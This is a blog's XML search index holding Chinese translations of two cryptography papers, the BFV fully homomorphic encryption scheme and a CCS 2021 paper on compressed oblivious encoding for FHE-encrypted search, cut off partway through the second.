<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BFV</title>
    <link href="/2022/01/22/BFV/"/>
    <url>/2022/01/22/BFV/</url>
    
    <content type="html"><![CDATA[<center><big>Somewhat Practical Fully Homomorphic Encryption</big></center><p><br></p><p><strong>摘要</strong><br></p><p>  在本文中，我们将基于错误学习(LWE)问题的Brakerski全同态方案修改为基于环-LWE设置。我们介绍了两种重新线性化的优化版本，不仅能够得到更小的重新线性化密钥，而且计算速度更快。我们提供了对各种同态操作详细但简洁的分析，，如乘法、重新线性化和自举，并推导出了这些操作引起的噪声的严格最坏情况界限。自举步骤的分析通过使用模量切换技巧而大大简化了。最后，我们推导了具体的参数，使方案提供一个给定的安全等级并实现全同态。</p><h1 id="介绍">1. 介绍</h1><p>  全同态加密(FHE)允许对加密数据进行任意函数求值，从而产生无数潜在的应用，比如私有云计算。Gentry第一个证明了FHE在理论上是可能的。他的构造由三部分组成：首先，构造一个部分同态的加密方案，即能够评估有限复杂度的函数，第二，尽可能简化方案的解密函数(称为压缩)，第三，对简化后的解密函数进行同态计算，得到噪声大小固定的密文（称为自举）。<br></p><p>  Gentry方案起初的变体都遵循相同的结构，因此必须做出额外的安全假设来支持压缩步骤。最近的方案避免了压缩步骤，并能够通过评估实际解密电路实现自举。最近的方案的另一个优点是它们的安全性是基于LWE问题或它的环变体RLWE的，其难度与(理想)格上的经典问题相关联。<br></p><p>  所有现存方案都有一个共同的特质，就说它们在加密过程中增加了一个小的"噪声"部分。对密文的同态计算将导致这些噪声增长，当噪声过大则导致解密失败。Gentry的自举方法可以用来将密文中的噪声降低到由解密电路的复杂性决定的固定水平。特别是同态乘法引起的噪声增长问题成为设计有效方案的主要障碍。在方案的第一代，噪声本身在每个同态乘法上相乘，导致电路深度成倍增长，即在纯密文(噪声为E)上评估一个深度为n的电路会导致噪声<span class="math inline">\(E^{2^{n}}\)</span>。第一个主要改进使得深度为n的电路噪声等级仅仅为<span class="math inline">\(E^{n}\)</span>。最新的方案进一步改进了这一点，使得每一个乘法的噪声等级都以一个常数因子增长，与密文中的噪声无关，即深度为n的电路的噪声为<span class="math inline">\(E·c(\lambda)^{n}\)</span>，其中<span class="math inline">\(c(\lambda)\)</span>是一个取决于安全参数的常量。<br></p><p>  至于这些建议是否真的可行，答案是“不可行”。对于上述提到的大多方案，已经进行了几次尝试，但没有一次是接近实用的。最近的一篇论文成功地使用大量(数十GB)的RAM内存在8天内同态执行了一个AES加密。当然，与最初的提案相比，在效率方面有了重大进步。<br></p><p>  这篇论文的主要贡献在于它的简单性，因为我们采用了务实的方法，因此任何多余的数学机制都被忽略了。本文的其他贡献如下：我们将基于LWE的Brakerski方案移植到了RLWE上，这本身是相当简单的。我们对各种同态操作提供了一个详细但简洁的分析，如乘法、重新线性化和自举，并推导出这些操作导致的噪声的严格最坏情况界限。使用一个简单的模量切换技巧，我们简化了自举步骤的分析。结合对该方案的实际安全性分析，最终得到了具有给定安全等级的全同态方案的具体参数。<br></p><p>  尽管该文章不是关于优化各种子程序的，但我们确实提供了两个版本的更有效的重新线性化。只要适用，我们将提到对提议方案仍然有效的现有优化。在后续的论文中，我们将通过在软件和硬件中实现它来考虑方案的实际实用性，这将表明标题确实是合理的。<br></p><p>  本文的其余部分如下：第二章简单地回顾了概率的符号和一些背景知识。第三章回顾了一个基于RLWE的加密方案，它将作为第四章中描述的部分同态方案的基础。第五章分析了自举步骤并确定了使部分同态方案实现全同态的最小深度。第六章使用了Lindner和Peikert的分析来推导给定安全等级的全同态方案的参数。最后，第七章总结了本文，并强调了正在进行的工作。<br></p><h1 id="前言">2. 前言</h1><h2 id="基础符号">2.1 基础符号</h2><p>  我们要研究的基本对象是多项式环<span class="math inline">\(R=\mathbb{Z}[x]/(f(x))\)</span>，其中<span class="math inline">\(f(x)\in\mathbb{Z}[x]\)</span>是一个阶为d的一元不可约多项式。在实际中，通常会限制使用一个分圆多项式<span class="math inline">\(\Phi_{m}(x)\)</span>，即原始m次根的最小多项式。用于说明目的通常选择取<span class="math inline">\(f(x)=x^{d}+1,d=2^{n}\)</span>.<br></p><p>  环R的元素将用小写粗体表示，例如<span class="math inline">\(\mathrm{a}\in R\)</span>。元素<span class="math inline">\(\mathrm{a}\in R\)</span>系数用<span class="math inline">\(a_{i}\)</span>表示，即<span class="math inline">\(\mathrm{a}=\sum_{i=0}^{d-1}{a_{i}·x^{i}}\)</span>。无穷范数<span class="math inline">\(||\mathrm{a}||\)</span>定义为<span class="math inline">\(max_{i}|a_{i}|\)</span>，R的扩张因子定义为<span class="math inline">\(\delta_{R}=max\{||\mathrm{a}||·||\mathrm{b}||:\mathrm{a},b\in R\}\)</span>.<br></p><p>  设q&gt;1是一个整数，我们用<span class="math inline">\(\mathbb{Z}_{q}\)</span>表示整数集合<span class="math inline">\((-q/2,q/2]\)</span>。注意，我们只简单地把<span class="math inline">\(\mathbb{Z}_{q}\)</span>看作一个集合，因此不应该和环<span class="math inline">\(\mathbb{Z}/q\mathbb{Z}\)</span>混淆。对于<span class="math inline">\(a\in\mathbb{Z}\)</span>，我们用<span class="math inline">\([a]_{q}\)</span>表示<span class="math inline">\(\mathbb{Z}_{q}\)</span>中的唯一整数，<span class="math inline">\([a]_{q}=a\ mod\ q\)</span>。在少数情况下我们需要在区间[0,q)内进行约简，记该区间为<span class="math inline">\(r_{q}(a)\)</span>(模q的剩余)。<br></p><p>  类似地，当<span class="math inline">\(\mathrm{a}\in R\)</span>，我们用<span class="math inline">\([\mathrm{a}]_{q}\)</span>表示R中通过将<span class="math inline">\([·]_{q}\)</span>应用到它所有的系数上得到的元素。对于<span class="math inline">\(x\in\mathbb{R}\)</span>，我们使用<span class="math inline">\(\lfloor x\rceil\)</span>表示四舍五入到最接近的整数，<span class="math inline">\(\lfloor x\rfloor,\lceil x\rceil\)</span>表示向下取整或向上取整。给定一个整数n，我们用size(n)表示它的大小，即<span class="math inline">\(size(n)=\lceil{log_{2}(n+0.5)}\rceil\)</span>。我们用<span class="math inline">\(n[i]\)</span>表示<span class="math inline">\(|n|\)</span>的位扩展中的第i比特(从0开始计数)。<br></p><p>  注意，所有算术运算都发生在R本身上，在许多情况下甚至(暂时地)发生在<span class="math inline">\(\mathbb{Q}[x]/(f(x))\)</span>。在实施本文提出的方案时，必须注意，计算结果可以模某一整数q。</p><h2 id="概率">2.2 概率</h2>]]></content>
    
    
    <categories>
      
      <category>FHE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>FHE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CCS21</title>
    <link href="/2022/01/17/CCS21/"/>
    <url>/2022/01/17/CCS21/</url>
    
    <content type="html"><![CDATA[<center><big>Compressed Oblivious Encoding for Homomorphically Encrypted Search</big></center><p><br></p><p><strong>摘要</strong><br></p><p>  全同态加密（FHE）为安全搜索提供了一个简单、有吸引力的框架。与其他安全搜索系统相比，不需要昂贵的设置过程；客户端只需要将加密的数据库上传到服务器就足够了。提供机密性是因为服务器只处理加密的查询和记录。而搜索功能是由加密方案的全同态实现的。<br></p><p>  由于这一原因，研究人员对该问题的关注度越来越高。自从Akavia等人提出了在FHE加密数据上进行安全搜索的框架，并给出了一个名为SPiRiT的实现，几个更加有效的实现方式已经被提出。<br></p><p>  在本文中，我们确定了该框架的主要瓶颈，并展示了如何显著提高基于FHE的安全搜索的性能。特别地，<br></p><ul><li>要检索ℓ匹配的项目，现有的框架需要按顺序重复该协议ℓ次。在我们的新框架中，所有匹配的项目都将在一次协议执行中被并行地检索出来。</li><li>Wren等人的最新工作需要进行<span class="math inline">\(O(n)\)</span>乘法运算来得到第一个匹配的索引。我们的解决方案不需要同态乘法，只用加法和标量乘法来编码所有匹配的索引。</li><li>我们的实现和实验证明了在获取16条匹配记录的过程中，我们的系统在获取查询结果方面比现有技术提高了1800倍，从而使全部搜索功能的速度提高了26倍。</li></ul><p><strong>关键词</strong><br></p><p>  安全搜索；加密数据库；全同态加密</p><h1 id="简介">1. 简介</h1><p>  随着计算范式向以云为中心的技术转变，这些技术的用户越来越关注他们上传到云端的数据的隐私和保密性。具体来说，客户上传数据到服务器，并期望得到以下保证：<br></p><p>  (1)上传的数据仍然是隐私的，即使对服务器本身来说；<br>   (2)服务器应该能够在上传数据上进行计算，来回应客户的查询；<br>   (3)客户应该能够以最少的后期处理有效地恢复服务器计算的结果。<br></p><p>  在这项工作中，我们将专注于安全搜索的计算任务。在该应用中，客户将一组记录上传到服务器，随后向服务器发送查询。计算过程分两步进行，称为匹配和获取。在匹配步骤中，服务器将客户加密的查询语句与数据库中的所有加密记录相比较，并计算一个加密的0/1向量，其中1表示相应的记录满足查询要求。获取步骤将所有1值的索引和相应的记录返回给客户端进行解密。<br></p><p>  虽然目标看似冲突，对安全搜索设置的(1)(2)(3)的保证可以通过如安全多方计算和可搜索加密等技术同时实现。最近的一系列工作都集中在基于全同态加密（FHE）的安全搜索上，我们接下来会介绍。<br></p><p>  <strong>基于全同态加密（FHE）的安全搜索。</strong>FHE加密数据的安全搜索框架的简单性很有吸引力。与其他安全搜索系统相比，不需要昂贵的设置过程；客户端只需要将加密的数据库上传到服务器即可。由于服务器只在加密的查询和记录上工作，因此提供了保密性。由于底层加密方案的完全同构的强大属性，服务器仍然能够正确地执行搜索。<br></p><p>  出于这个原因，研究人员越来越关注这个问题。特别地，Akavia等人介绍了一个对FHE加密数据进行安全搜索的框架（参见图1）<br> <img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyfunq1chgj30o10bgq7b.jpg" /></p><p>  非正式地说，一个安全的、同态的加密搜索方案由如下设置：<br></p><p>  (1)(setup)客户加密并上传n项<span class="math inline">\(x=(x_{1},...,x_{n})\)</span>至服务器。设<span class="math inline">\([x]=([x_{1}],...,[x_{n}])\)</span>，表示存储在服务器中的加密数据。<br></p><p>  在本文中，我们设<span class="math inline">\([·]\)</span>表示一个FHE加密的密文。在加密记录被上传后，客户可以使用三种算法进行安全搜索（查询，匹配，获取）<br></p><p>  (2)(query)客户发送加密查询<span class="math inline">\([q]\)</span>至服务器。<br></p><p>  (3)(match)服务器同态地在每一个记录<span class="math inline">\([x_{i}]\)</span>上评估查询<span class="math inline">\([q]\)</span>，以得到加密的匹配结果<span class="math inline">\([b]=([b_{1}],...,[b_{n}])\)</span>。也就是说，如果<span class="math inline">\(x_{i}\)</span>满足给定查询q，则<span class="math inline">\(b_{i}\)</span>是1，否则<span class="math inline">\(b_{i}\)</span>是0。<br></p><p>  (4)(fetch)给定<span class="math inline">\([b]\)</span>，服务器同态地计算<span class="math inline">\([i^{*}]\)</span>，其中<span class="math inline">\(i^{*}=min\{i\in{[n]:b_{i}=1}\}\)</span>，对应于第一个匹配记录索引。得到<span class="math inline">\([x_{i}]\)</span>并发送<span class="math inline">\(([i^{*}],[x_{i^{*}}])\)</span>给客户解密。<br></p><p>  <strong>匹配步骤中的乘法。</strong>Akavia等人同样提供了一种构造，在<span class="math inline">\(O(n\ log^{2}{n})\)</span>次同态乘法中执行fetch步骤。随后，人们提出了<span class="math inline">\(O(n\ logn)\)</span>次乘法和<span class="math inline">\(O(n)\)</span>次乘法的更高效的算法。</p><h2 id="动机">1.1 动机</h2><p>  <strong>瓶颈：按顺序获取记录。</strong>假设客户想要得到所有匹配项。在上述框架下，客户需要首先得到第一个匹配索引<span class="math inline">\(i^{*}\)</span>和它对应的项<span class="math inline">\(x_{i}\)</span>。为了得到第二个匹配项，客户应该把原来的查询q略微修改，变为新的查询<span class="math inline">\(q_{i^{*}}&#39;\)</span>，具体如下：<br></p><ul><li>如果<span class="math inline">\(q(i,x_{i})\)</span>为真且<span class="math inline">\(i&gt;i^{*}\)</span>，则<span class="math inline">\(q_{i^{*}}&#39;(i,x_{i})\)</span>返回真。</li></ul><p>  通过执行一个带有加密查询<span class="math inline">\([q_{i^{*}}&#39;]\)</span>的协议的新实例，客户将得到第二个匹配项。通过重复这一过程，客户将最终得到所有的匹配记录。<br></p><p>  注意查询<span class="math inline">\(q_{i^{*}}&#39;\)</span>将<span class="math inline">\(i^{*}\)</span>作为一个常数嵌入自身，这表明客户没有办法在不获得<span class="math inline">\(i^{*}\)</span>的情况下构造该查询<span class="math inline">\(q_{i^{*}}&#39;\)</span>。换句话说，客户只有在得到第一个匹配项后才能构造第二个匹配项的查询。从这个意义上说，框架内在地限制了客户端每次只能以顺序的方式获取一条匹配记录。<br></p><p>  如果存在ℓ匹配记录，客户和服务器将不得不执行ℓ查询、匹配和获取算法的实例。因为每个匹配和搜索步骤需要昂贵的同态乘法，顺序协议执行的限制在运行时间方面造成了严重的瓶颈。这导致我们提出了以下的自然问题：<br></p><p>  是否存在一个不同的安全搜索框架，允许客户通过较小次数的协议执行，获取所有匹配项，可能避免连续的记录获取？<br></p><p>  <strong>约简同态乘法。</strong>所有先前的方案都必须在获取步骤中进行<span class="math inline">\(\Omega(n)\)</span>同态乘法。由于同态乘法是昂贵的操作，我们希望减少这种计算，这就提出了以下的自然问题：<br></p><p>  能否减少获取步骤中同态乘法的数量？<br></p><p>  在本文中，我们回答了上述两个问题。</p><h2 id="我们的工作">1.2 我们的工作</h2><p>  <strong>并行化获取过程。</strong>为了解决这些问题，我们引入了一个新的安全搜索框架，在这个框架中，匹配项在一个恒定的轮次中被并行检索。我们的设置、查询和匹配算法与先前的工作一样。但是，我们修改了获取过程，将其分为两个步骤：编码和解码。在编码步骤中，服务器同态地将匹配项插入一个数据结构——具体结构取决于构造，我们提供了3中不同的构造，分别使用不同的编码。在接收加密编码后，客户解密该编码，并运行解码步骤恢复项。<br></p><p>  <strong>压缩不经意编码。</strong>编码是同态计算的，最重要的是，允许对整个结果集进行编码，而不仅仅是单个项。特别地，我们引入了压缩不经意编码(COE)的概念。一个压缩不经意编码以一个较大但稀疏的向量作为输入，并将其压缩为更小的编码，从中可以恢复原始向量的非零项。之所以编码是不经意的，是因为编码过程是在加密数据上执行的。在特定构造中，编码包括数据值(CODE，压缩不经意数据编码)，而在其他情况下，它只包含索引(COIE，压缩不经意索引编码)。后一种情况下，解码过程是交互式的，允许客户端从解码后的索引集中恢复数值。<br></p><p>  简单起见，在描述安全搜索方案的通用语法时，我们将编码过程表示为将索引和值都作为输入的情况，我们抑制了这样一个事实，当编码期间不使用值时，解码步骤必须是交互式的。回顾一下，我们使用<span class="math inline">\([b]=([b_{1}],...,[b_{n}])\)</span>表示匹配过程得到的加密比特向量。<br></p><p>  (4)(encode)设<span class="math inline">\(S=\{i\in{[n]}:b_{i}=1\},V={v_{i}:i\in{S}}\)</span>。服务器同态地评估<span class="math inline">\([encoding(S,V)]\)</span>并将其发送给客户。<br></p><p>  (5)(decode)客户解密<span class="math inline">\([encoding(S)]\)</span>并运行解码过程以恢复(S,V)。<br></p><p>  我们假设结果集<span class="math inline">\(|S|\)</span>是很小的(即在n是次线性的)。我们希望在n中压缩编码的大小是次线性的，以保持有意义的通信成本。<br></p><p>  编码步骤中没有乘法。为了确保编码结果的计算代价最小，我们同时想要最小化同态乘法的次数。回顾一下，最好的前期工作需要服务器进行<span class="math inline">\(O(n)\)</span>乘法。有些令人惊讶的是，我们演示了3种编码算法，可以在不进行同态乘法的情况下进行计算！<br></p><p>  使用PIR(私有信息检索)。图2展示了搜索协议的渐近复杂性和权衡。</p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gygjjxqmvtj30o109yah2.jpg" /></p><p>  在我们的某些协议中(即BF-COIE和PS-COIE搜索协议；参见第4章和第6.3章)，索引和实际记录是分步骤获取的。这允许我们专注于优化索引的检索，之后可以使用高效(无设置)PIR协议获取值，从而实现整体节约。<br></p><p>  但是，如果不希望依赖于PIR，我们同时提供了一个直接获取值的变体(即图2中的w/BFS-CODE协议)，正如先前的工作。<br></p><p>  实现。我们实现了所有提出的方案并将它们的性能与先前的工作进行了比较。我们的实验证明了我们方案的性能比之前的获取过程高出1800倍，这使得整个搜索功能的速度提高了26倍。<br></p><h1 id="准备工作">2. 准备工作</h1><p>  设<span class="math inline">\(\lambda\)</span>是安全参数。对于向量<span class="math inline">\(a\)</span>，设<span class="math inline">\(nzx(a)\)</span>表示所有<span class="math inline">\(a_{i}\)</span>为非零项的位置i的集合，即<span class="math inline">\(nzx(a):=\{i:a_{i}\ne0\}\)</span><br></p><p>  <strong>切尔诺夫限。</strong>我们将使用如下版本的切尔诺夫限。<br></p><p>  <strong>定理2.1</strong> 设<span class="math inline">\(X_{1},...,X_{n}\)</span>是独立随机变量，其值位于{0,1}，从而有<span class="math inline">\(Pr[X_{i}=1]=p\)</span>。设<span class="math inline">\(\mu:=Exp[\sum{X_{i}}]=np\)</span>。则对于任意<span class="math inline">\(\delta&gt;0\)</span>，有<span class="math inline">\(Pr[\sum_{i=1}^{n}{X_{i}\ge(1+\delta)\mu}]\le(\frac{e^{\delta}}{(1+\delta)^{(1+\delta)}})^{\mu}\)</span><br></p><p>  <strong>FHE。</strong>我们使用标准的CPA安全(分级)全同态加密方案(Gen、Enc、Dec)。用<span class="math inline">\([x]\)</span>表示x的一个加密。<br></p><p>  我们同时使用<span class="math inline">\(+(·)\)</span>表示同态加法(乘法)。例如，<span class="math inline">\([c]:=[a]+[b]\)</span>意味着两个FHE密文<span class="math inline">\([a]\)</span>和<span class="math inline">\([b]\)</span>的同态加法，结果为<span class="math inline">\([c]\)</span>。<br></p><p>  <strong>PIR。</strong>PIR协议允许客户选择索引i并从一个(或更多)不受信任的服务器中检索i，而隐藏索引值i。<br></p><p>  假设k个服务器中每一个都有n条记录<span class="math inline">\(D=(d_{1},...,d_{n})\)</span>，其中所有项<span class="math inline">\(d_{i}\)</span>都有相同的长度。一轮k-服务器PIR协议由以下算法组成：<br></p><ul><li>查询算法<span class="math inline">\(Q_{j}(i,r)\to{q_{j}}\)</span>，服务器<span class="math inline">\(j\in{k}\)</span>，由客户端输入索引i和随机数r执行。</li><li>回答算法<span class="math inline">\(A_{j}(D,q_{j})\to{a_{j}}\)</span>，服务器<span class="math inline">\(j\in{k}\)</span>，由第j个服务器执行。</li><li>重新构造算法<span class="math inline">\(R(i,r,(a_{1},...,a_{k}))\to{d_{i}}\)</span>.</li></ul><p>PIR协议的通信复杂度由所有查询长度和回答长度的和定义，即<span class="math inline">\(\sum_{j\in{[k]}}{|q_{j}|+|a_{j}|}\)</span>。<br></p><p>  如果对任意<span class="math inline">\(D=(d_{1},...d_{n}),|d_{1}|=...=|d_{n}|,i\in{[n]}\)</span>，PIR协议是正确的，当<span class="math inline">\(Pr[R(i,r,\{A_{j}(D,Q_{j}(i,r))\}_{j=1}^{k})=d_{i}]=1\)</span>。如果对任意<span class="math inline">\(j\in{k},i_{0},i_{1}\in{[n]},i_{0}\ne{i_{1}}\)</span>，PIR协议是隐私的，当分布<span class="math inline">\(\{Q_{j}(i_{0},r)\}_{r}\approx{\{Q_{j}(i_{1},r)\}_{r}}\)</span>在计算上（或统计上）无法区分。</p><h2 id="布隆过滤器">2.1 布隆过滤器</h2><p>  布隆过滤器是一个著名的空间有效数据结构，允许用户插入任意关键词，然后检查过滤器中的某个关键词是否符合要求。<br></p><p>  <span class="math inline">\(BF.Init().\)</span>过滤器B本质是一个ℓ比特向量，其中ℓ是一个参数，初始化时为全零。该过滤器还与一组<span class="math inline">\(\eta\)</span>个不同哈希函数的集合有关<span class="math inline">\(\mathcal{H}=\{h_{q}:\{0,1\}^{*}\to{[\mathcal{l}]}\}_{q=1}^{n}\)</span><br></p><p>  <span class="math inline">\(BF.Insert(B,\alpha).\)</span>为了插入关键词<span class="math inline">\(\alpha\)</span>，将哈希结果加入到过滤器中，特别地，对于<span class="math inline">\(q\in{[\eta]}\)</span>，计算<span class="math inline">\(j=h_{q}(\alpha)\)</span>，并设置<span class="math inline">\(B_{j}:=1\)</span>。<span class="math inline">\(B_{j}\)</span>是B的第j比特。<br></p><p>  <span class="math inline">\(BF.Check(B,\beta).\)</span>为检查关键词<span class="math inline">\(\beta\)</span>是否被插入到BF过滤器B中，可以直接用所有哈希结果来检查过滤器。特别地，对于<span class="math inline">\(q\in{[\eta]}\)</span>，计算<span class="math inline">\(j=h_{q}(\beta)\)</span>，并检查<span class="math inline">\(B_{j}\)</span>是否被设置；如果所有检查都通过则输出“yes”，否则输出“no”。<br></p><p>  过滤器的主要优势是它保证不会有false negatives，并允许一个可调的false positives：<span class="math inline">\((1-(1-\frac{1}{\mathcal{l}})^{\eta s})^{\eta}\approx(1-e^{-\frac{\eta s}{\mathcal{l}}})^{\eta}\)</span>，其中s是布隆过滤器中关键词的数量。<br></p><p>  <strong>哈希函数的随机预言模型。</strong>我们在随机预言模型上证明了我们的分析。也就是说，哈希函数被构造为随机函数。</p><h2 id="代数布隆过滤器">2.2 代数布隆过滤器</h2><p>  在这项工作中，我们利用了布隆过滤器的一个变体，当插入一项时，按位排序的OR操作被加法操作取代。有一些工作使用了类似的想法，让每个单元保存一个整数，而不是一个比特。<br></p><p>  此外，我们考虑了一个受限的场景，即预先知道要插入关键词数量的上界。特别地，设s表示该上界。<br></p><p>  与之前一样，过滤器还与<span class="math inline">\(\eta\)</span>个不同哈希函数的集合<span class="math inline">\(\mathcal{H}=\{h_{q}:\{0,1\}^{*}\to{[\mathcal{l}]}\}_{q=1}^{n}\)</span>相关联。但是，现在该过滤器B不是一个ℓ比特向量，其每个元素都位于<span class="math inline">\([s\eta]\)</span>(即<span class="math inline">\(B\in{[s\eta]^{\mathcal{l}}}\)</span>)。因此，编码B的比特数被乘法因子<span class="math inline">\(\lceil{lg\ s\eta}\rceil\)</span>放大。<br></p><p>  下面描述的BF操作，其差异用框标记。<br></p><p>  <span class="math inline">\(BF.Insert(B,\alpha).\)</span>为了插入关键词<span class="math inline">\(\alpha\)</span>，将哈希结果加入到过滤器中，特别地，对于<span class="math inline">\(q\in{[\eta]}\)</span>，计算<span class="math inline">\(j=h_{q}(\alpha)\)</span>，并设置<span class="math inline">\(B_{j}:=B_{j}+1\)</span><br></p><p>  <span class="math inline">\(BF.Check(B,\beta).\)</span>为检查关键词<span class="math inline">\(\beta\)</span>是否被插入到BF过滤器B中，可以直接用所有哈希结果来检查过滤器。特别地，对于<span class="math inline">\(q\in{[\eta]}\)</span>，计算<span class="math inline">\(j=h_{q}(\beta)\)</span>，并检查<span class="math inline">\(B_{j}\)</span>是否大于0；如果所有的检查都通过则输出“yes”，否则输出“no”。<br></p><p>  很容易看出，这种变体构造与原BF构造具有相同的性能。</p><h1 id="压缩不经意编码">3. 压缩不经意编码</h1><p>  作为我们的主要构建块，我们引入了一个新的工具，我们称之为压缩不经意编码。压缩不经意编码将一个大但稀疏的向量作为输入，并将其压缩为一个更小的编码，从这个编码中可以恢复原向量的非零项。编码无关是因为编码过程对原始数据是无关的；事实上，在我们的构造中，原始数据都将被加密。一个有效编码必须满足以下两个性能要求：1)编码的大小必须是原始数组的大小的次线性，2)构造这种编码在计算上应该不昂贵。我们的构造只使用常数间(即明文值)的(同态的)加法和乘法。<br></p><p>  一个相关的概念是，对加密数据进行压缩目的是将一个向量的所有非零项放在编码的前面。我们的编码可以被看作噪声压缩的一种形式，其中除了保留所有非零项之外，还允许在结果中混入少量零项。因此，压缩编码用输出中的一些不准确性换取了更便宜的构造成本。<br></p><p>  我们定义了两种压缩不经意编码的变体，一种编码非零项的索引，另一种编码实际项本身。</p><h2 id="压缩不经意索引编码">3.1 压缩不经意索引编码</h2><p>  压缩不经意索引编码(COIE)编码输入数组中的所有非零项的索引或位置。我们首先定义COIE模式的参数和语法。<br></p><p>  <strong>参数。</strong>一个COIE方案参数化如下:</p><ul><li>n: Input size——输入向量v的维数。</li><li>s: Sparsity——v中非零项数目的界限。</li><li>c: Compactness——输出编码的维数。</li><li><span class="math inline">\(f_{p}\)</span>: False positives——解码算法返回的false positives数量的上限。</li></ul><p>  <strong>语法。</strong>一个<span class="math inline">\((n,s,c,f_{p})-COIE\)</span>方案有如下语法：</p><ul><li><span class="math inline">\([\gamma_{1}],...,[\gamma_{c}]\gets Encode([v_{1}],...,[v_{n}])\)</span>: 编码算法以密文向量<span class="math inline">\(v_{i}\in\{0,1\},i\in[n]\)</span>作为输入，输出加密编码<span class="math inline">\([\gamma_{1}],...,[\gamma_{c}]\)</span>.</li><li><span class="math inline">\(I\gets Decode(\gamma_{1},...,\gamma_{c})\)</span>: 解码算法以解密后的编码<span class="math inline">\((\gamma_{1},...,\gamma_{c})\)</span>作为输入，输出集合<span class="math inline">\(I\subseteq[n]\)</span>.</li></ul><p>  <strong>正确性。</strong>设<span class="math inline">\((\gamma_{1},...,\gamma_{c})\gets Dec([\gamma_{1}],...,[\gamma_{c}])\)</span>表示一个编码的正确解密。<br></p><p>  <strong>定义3.1</strong> 如果满足下列情况，则<span class="math inline">\((n,s,c,f_{p})-COIE\)</span>方案是正确的：</p><ul><li>(No false negatives)对于所有<span class="math inline">\(v\in\{0,1\}^{n}\)</span>，至多有s个非零位置，对于所有<span class="math inline">\(i\in{nzx(v)}\)</span>，有<span class="math inline">\(i\in Decode(Dec(Encode([v_{1}],...,[v_{n}])))\)</span>，其概率至少为<span class="math inline">\(1-negl(\lambda)\)</span>，其中random coins取自Encode</li><li>(Few false positives)对于所有<span class="math inline">\(v\in D^{n}\)</span>，至多s个非零位置，考虑false positives集合<span class="math inline">\(E=\{i\in[n]:v_{i}=0,but\ i\in I\}\)</span>，其中<span class="math inline">\(I=Decode(Dec(Encode([v_{1}],...,[v_{n}])))\)</span>。我们要求<span class="math inline">\(|E|\leqslant f_{p}\)</span></li></ul><p>  <strong>效率。</strong>为了效率，我们考虑以下COIE的三个参数：</p><ul><li>编码算法使用的操作类型和数量。</li><li>编码的大小。</li><li>解码算法的计算花销。</li></ul><p>  对于高效的构造，我们要求后两个在输入向量的大小上是次线性的。</p><h2 id="压缩不经意数据编码">3.2 压缩不经意数据编码</h2><p>  压缩不经意数据编码(CODE)与COIE非常类似，只是它编码的不是非零项的位置，而是这些项的值。我们给出CODE的定义如下，区别用框标记。<br></p><p>  <strong>参数。</strong>CODE方案由与COIE相同的四个参数进行参数化<span class="math inline">\((n,s,c,f_{p})\)</span>.<br></p><p>  <strong>语法。</strong>域D上的<span class="math inline">\((n,s,c,f_{p})-CODE\)</span>方案有如下语法：</p><ul><li><span class="math inline">\([\gamma_{1}],...,[\gamma_{c}]\gets Encode([v_{1}],...,[v_{n}])\)</span>: 编码算法以密文向量<span class="math inline">\(v_{i}\in D,i\in[n]\)</span>作为输入，输出加密编码<span class="math inline">\([\gamma_{1}],...,[\gamma_{c}]\)</span>.</li><li><span class="math inline">\(V\gets Decode(\gamma_{1},...,\gamma_{c})\)</span>: 解码算法以解密后的编码<span class="math inline">\((\gamma_{1},...,\gamma_{c})\)</span>作为输入，输出值的集合<span class="math inline">\(V=\{v_{i}:v_{i}\ne 0\}\)</span>.</li></ul><p>  <strong>正确性。</strong><br></p><p>  <strong>定义3.2</strong> 如果满足以下情况，则域D上的<span class="math inline">\((n,s,c,f_{p})-CODE\)</span>方案是正确的：</p><ul><li>(No false negatives)对于所有<span class="math inline">\(v\in\{0,1\}^{n}\)</span>，至多有s个非零位置，对于所有<span class="math inline">\(i\in nzx(v)\)</span>，有<span class="math inline">\(v_{i}\in Decode(Dec(Encode([v_{1}],...,[v_{n}])))\)</span>，其概率至少为<span class="math inline">\(1-negl(\lambda)\)</span>，其中random coins取自Encode</li><li>(Few false positives)对于所有<span class="math inline">\(v\in D^{n}\)</span>，至多s个非零位置，考虑false positives集合<span class="math inline">\(E=\{z\in V:z\ne v_{i}\ for\ any\ i\in nzx(v)\}\)</span>其中<span class="math inline">\(V=Decode(Dec(Encode([v_{1}],...,[v_{n}])))\)</span>。我们要求<span class="math inline">\(|E|\leqslant f_{p}\)</span></li></ul><h1 id="coie方案">4. COIE方案</h1><p>  我们假设输入索引向量<span class="math inline">\(v\in\{0,1\}^{n}\)</span>是稀疏的。特别地，在本文中我们假设<span class="math inline">\(s=o(n)\)</span>.</p><h2 id="warm-up构造">4.1 warm-up构造</h2><p>  使用代数BF，我们可以构造一个<span class="math inline">\((n,s,c,f_{p})-COIE\)</span>方案(参数c和f_{p}将在方案描述后进行计算)。<br></p><p>  <span class="math inline">\(Encode([v_{1}],...,[v_{n}])\)</span>编码算法工作如下：<br></p><p>  (1)初始化<span class="math inline">\([B]=([B_{1}],...,[B_{c}])\)</span>，对所有j有<span class="math inline">\(B_{j}=0\)</span>。设<span class="math inline">\(\mathcal{H}=\{h_{q}:\{0,1\}^{*}\to{[\mathcal{l}]}\}_{q=1}^{n}\)</span>是相关联的哈希函数集合。<br></p><p>  (2)对<span class="math inline">\(i=1,...,n\)</span>:<br></p><p>   (a)对于<span class="math inline">\(q=1,...,\eta\)</span>，计算<span class="math inline">\(j=h_{q}(i)\)</span>并设置<span class="math inline">\([B_{j}]:=[B_{j}]+[v_{i}]\)</span><br></p><p>  注意上述步骤2.a，若<span class="math inline">\(v_{i}=0\)</span>，则<span class="math inline">\(B_{j}\)</span>保持不变。另一方面，若<span class="math inline">\(v_{i}=1\)</span>，则<span class="math inline">\(B_{j}\)</span>将增加1。这表明B将准确地存储操作<span class="math inline">\(\{BF.Insert(B,i):i\in nzx(v)\}\)</span>的结果。<br></p><p>  <span class="math inline">\(Decode(B_{1},...,B_{c})\)</span>给定代数BF B，我们可以恢复非零元素的索引如下：</p><ul><li>初始化I为空集合。</li><li>对于<span class="math inline">\(i\in[n]\)</span>: 如果<span class="math inline">\(BF.Check(B,i)=yes\)</span>，将i加到I中。</li><li>返回I。</li></ul><p>  <strong>参数𝑐和<span class="math inline">\(f_{p}\)</span>。</strong>因为这是一个warm-up构造，我们只粗略地估计false positive参数和compactness参数。<br></p><p>  出于后续原因，我们希望保持false positives<span 